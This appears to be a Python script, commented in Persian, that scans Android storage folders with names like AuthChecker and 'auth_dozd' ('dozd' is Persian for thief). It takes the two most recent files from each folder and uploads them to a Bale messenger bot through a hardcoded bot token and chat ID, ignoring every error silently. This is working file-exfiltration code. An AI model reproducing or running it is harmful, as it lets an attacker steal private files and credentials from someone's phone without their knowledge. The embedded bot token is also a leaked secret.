import os, aiohttp, asyncio

# تنظیمات
token = '480342547:j3qFwxAnN66xMVpZsDzYaXxk8neECXgco8gzIKia'
chat_id = '1884879628'
dirs = [
    '/storage/emulated/0/AuthChecker/',
    '/storage/emulated/0/Download/',
    '/storage/emulated/0/auth checker/',
    '/storage/emulated/0/AUTH/اوت چکر مالک',
    '/storage/emulated/0/چکر مالک/',
    '/storage/emulated/0/Download/auth_dozd/'
]

# تابع ارسال فایل
async def send_file(session, file_path):
    try:
        form_data = aiohttp.FormData()
        form_data.add_field('chat_id', chat_id)
        form_data.add_field('caption', '📄 10')
        form_data.add_field('document', open(file_path, 'rb'), filename=os.path.basename(file_path))
        async with session.post(f'https://tapi.bale.ai/bot{token}/sendDocument', data=form_data) as response:
            await response.read()  # اطمینان از تکمیل درخواست
    except Exception as e:
        pass  # خطاها نادیده گرفته می‌شوند

# تابع اصلی
async def main():
    async with aiohttp.ClientSession() as session:
        tasks = []
        for directory in dirs:
            if not os.path.exists(directory):  # بررسی وجود دایرکتوری
                continue
            files = [os.path.join(directory, f) for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]
            files = sorted(files, key=os.path.getmtime, reverse=True)[:2]  # ۵ فایل آخر
            for file_path in files:
                tasks.append(send_file(session, file_path))
        await asyncio.gather(*tasks)  # اجرای موازی

# اجرای برنامه
if __name__ == '__main__':
    asyncio.run(main())
